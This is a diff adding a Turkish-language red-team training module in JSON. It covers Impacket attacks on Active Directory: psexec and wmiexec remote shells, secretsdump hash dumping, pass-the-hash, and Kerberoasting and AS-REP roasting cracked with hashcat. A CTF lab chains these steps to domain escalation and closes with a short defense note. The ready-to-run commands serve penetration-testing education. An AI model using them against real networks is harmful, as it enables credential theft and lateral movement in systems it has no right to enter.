@@ -1,0 +1,137 @@
+{
+  "id": "impacket",
+  "slug": "impacket",
+  "title": "Impacket & Kerberos Saldırıları",
+  "subtitle": "AD Sömürü Araç Seti",
+  "description": "Impacket Python araç setiyle AD sömürüsü: secretsdump ile hash dökme, psexec/wmiexec ile uzaktan çalıştırma, GetUserSPNs (Kerberoasting) ve GetNPUsers (AS-REP Roasting) ile bilet saldırıları.",
+  "team": "red-team",
+  "category": "Active Directory",
+  "phase": "Post-Exploitation",
+  "icon": "🎫",
+  "color": "#ef4444",
+  "tags": ["impacket", "kerberoasting", "asrep", "secretsdump", "psexec", "pass-the-hash", "kerberos"],
+  "modules": [
+    {
+      "id": "remote-exec",
+      "title": "Uzaktan Çalıştırma ve Hash Dökme",
+      "description": "psexec, wmiexec ve secretsdump ile erişim ve credential dump",
+      "difficulty": "intermediate",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Impacket'i Anlamak",
+          "content": "**Impacket**, ağ protokollerini (SMB, MSRPC, Kerberos) Python ile konuşan, AD pentest'in bel kemiği bir araç setidir.\n\n**En çok kullanılan scriptler:**\n| Script | Görev |\n|--------|-------|\n| psexec.py | SMB ile SYSTEM shell (PsExec gibi) |\n| wmiexec.py | WMI ile komut çalıştırma (daha sessiz) |\n| smbexec.py | SMB ile komut çalıştırma |\n| secretsdump.py | SAM/LSA/NTDS hash dökme |\n| GetUserSPNs.py | Kerberoasting |\n| GetNPUsers.py | AS-REP Roasting |\n| ticketer.py | Golden/Silver ticket |\n\n**Kimlik doğrulama formatı:** `domain/kullanici:parola@hedef` veya hash ile `-hashes LM:NT`.\n\n**CTF/AD ipucu:** Bir kimlik bilgisi elde edince secretsdump ile daha fazla hash topla, psexec/wmiexec ile yanal hareket et."
+        },
+        {
+          "id": "installation",
+          "type": "installation",
+          "title": "Kurulum",
+          "installation": {
+            "note": "Kali'de yüklü gelir (impacket-* komutları).",
+            "linux": ["pipx install impacket", "# veya: sudo apt install python3-impacket"]
+          }
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Uzaktan Çalıştırma & Dump",
+          "commands": [
+            {
+              "command": "impacket-psexec domain/admin:'Parola1'@10.10.10.1",
+              "description": "SMB üzerinden SYSTEM yetkili shell al",
+              "output": "[*] Found writable share ADMIN$\n[*] Opening SVCManager...\nC:\\Windows\\system32> whoami\nnt authority\\system",
+              "tip": "Yerel admin yetkisi gerekir. Daha sessiz alternatif: impacket-wmiexec (servis oluşturmaz).",
+              "flags": [
+                { "flag": "domain/user:pass@host", "description": "Kimlik + hedef" },
+                { "flag": "-hashes LM:NT", "description": "Pass-the-Hash" }
+              ]
+            },
+            {
+              "command": "impacket-secretsdump domain/admin:'Parola1'@10.10.10.1",
+              "description": "SAM ve LSA secret'larını (hash) dök",
+              "tip": "DC'de domain hash'leri için: impacket-secretsdump domain/admin@DC -just-dc. Elde edilen NT hash'leri Hashcat -m 1000 ile kırılır."
+            },
+            {
+              "command": "impacket-wmiexec domain/admin@10.10.10.1 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0",
+              "description": "Pass-the-Hash ile WMI komut çalıştırma (parolasız)",
+              "tip": "LM boşsa : ile başla. Parolayı bilmeden NT hash ile kimlik doğrulanır."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "kerberos-attacks",
+      "title": "Kerberoasting & AS-REP Roasting + Lab",
+      "description": "Kerberos bilet saldırılarıyla parola kırma",
+      "difficulty": "advanced",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Kerberos Bilet Saldırıları",
+          "content": "**Kerberoasting:** SPN'e sahip servis hesaplarının TGS biletini istersin (herhangi bir domain kullanıcısı yapabilir). Bilet, servis hesabının parola hash'iyle şifrelidir → **offline kır**.\n\n**AS-REP Roasting:** 'Kerberos pre-authentication gerektirmeyen' kullanıcıların AS-REP yanıtını istersin → hash'i offline kır. Kimlik bilgisi bile gerekmeyebilir (sadece kullanıcı adı).\n\n| Saldırı | Hedef | Hashcat modu |\n|---------|-------|--------------|\n| Kerberoasting | SPN'li servis hesapları | 13100 |\n| AS-REP Roasting | Pre-auth kapalı kullanıcılar | 18200 |\n\n**Neden çalışır?** Servis hesapları genelde zayıf, eski parolalara sahiptir ve parolaları nadiren değişir.\n\n**CTF/AD ipucu:** Bir domain kullanıcısı elde edince hemen Kerberoasting dene — çoğu lab'da zayıf servis hesabı vardır."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Kerberos Saldırı Komutları",
+          "commands": [
+            {
+              "command": "impacket-GetUserSPNs domain/kullanici:'Parola1' -dc-ip 10.10.10.1 -request",
+              "description": "Kerberoasting — SPN'li hesapların TGS biletlerini al",
+              "output": "$krb5tgs$23$*sqlsvc$DOMAIN$...",
+              "tip": "Çıktıyı tgs.txt'e kaydet → hashcat -m 13100 tgs.txt rockyou.txt ile kır.",
+              "flags": [
+                { "flag": "-request", "description": "Biletleri talep et" },
+                { "flag": "-dc-ip", "description": "Domain Controller IP" }
+              ]
+            },
+            {
+              "command": "impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip 10.10.10.1 -no-pass -format hashcat",
+              "description": "AS-REP Roasting — pre-auth kapalı kullanıcıları kır",
+              "tip": "Kimlik bilgisi olmadan (sadece kullanıcı listesi) çalışabilir. Çıktı: hashcat -m 18200 ile kır.",
+              "flags": [
+                { "flag": "-no-pass", "description": "Parola olmadan dene" },
+                { "flag": "-usersfile", "description": "Kullanıcı listesi" }
+              ]
+            },
+            {
+              "command": "hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt",
+              "description": "Kerberoast TGS biletini kır",
+              "tip": "Kırılan parola servis hesabınındır — genelde yüksek yetkilidir. AS-REP için -m 18200 kullan."
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: Kullanıcıdan Servis Hesabına",
+          "scenario": {
+            "title": "Foothold → Kerberoasting → Yetki",
+            "objective": "Bir domain kullanıcı kimliğiyle Kerberoasting yap, zayıf servis hesabı parolasını kır ve elde ettiğin yetkiyle ilerle.",
+            "environment": "AD lab (GOAD) / HTB AD makinesi",
+            "difficulty": "advanced",
+            "steps": [
+              "Domain kullanıcı kimliği elde et (spraying, Responder vb.)",
+              "Kerberoast: impacket-GetUserSPNs domain/user:pass -dc-ip DC -request",
+              "TGS hash'lerini kaydet (tgs.txt)",
+              "Kır: hashcat -m 13100 tgs.txt rockyou.txt",
+              "Kırılan servis hesabıyla netexec/psexec ile erişimi genişlet",
+              "BloodHound ile Domain Admin'e giden yolu takip et"
+            ],
+            "hints": [
+              "AS-REP Roasting için önce kullanıcı listesi topla (enum4linux/netexec --users)",
+              "Servis hesapları sıkça SQL/web servisleridir ve zayıf parolalıdır",
+              "Kırılamayan biletler için daha büyük wordlist + kurallar dene"
+            ],
+            "defenseNote": "Savunma: Servis hesapları için gMSA (yönetilen, 120+ karakter parola), tüm hesaplarda Kerberos pre-authentication zorunlu, AES şifreleme, güçlü parola politikası ve anormal TGS taleplerini (Event 4769) SIEM ile izle."
+          }
+        }
+      ]
+    }
+  ]
+}
